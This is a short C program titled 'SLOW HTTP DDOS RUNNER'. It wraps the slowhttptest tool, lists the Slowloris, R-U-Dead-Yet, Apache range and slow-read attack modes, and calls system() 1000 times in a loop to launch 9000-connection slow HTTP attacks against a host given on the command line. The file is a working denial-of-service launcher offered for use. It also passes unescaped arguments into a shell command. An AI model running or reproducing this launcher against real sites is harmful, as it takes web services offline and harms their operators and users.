//SLOW HTTP DDOS RUNNER

#include<stdio.h>
#include<stdlib.h>
#include<string.h>

/* for everyone
  -H               slow headers a.k.a. Slowloris (default)
  -B               slow body a.k.a R-U-Dead-Yet
  -R               range attack a.k.a Apache killer
  -X               slow read a.k.a Slow Read
*/




int main(int argc, char* argv[])
{
	int count=0;
	char template[512]={0};
	if(argc!=4)
		return 0;
	if((strlen(argv[1])+strlen(argv[2])+strlen(argv[3]))>256)
		return 0;
	sprintf(template,"slowhttptest -c 9000 %s -u %s://%s/",argv[1],argv[2],argv[3]);
	for(count=0;count<1000;count++)
	{
		system(template);

	}	
	return 0;	
}
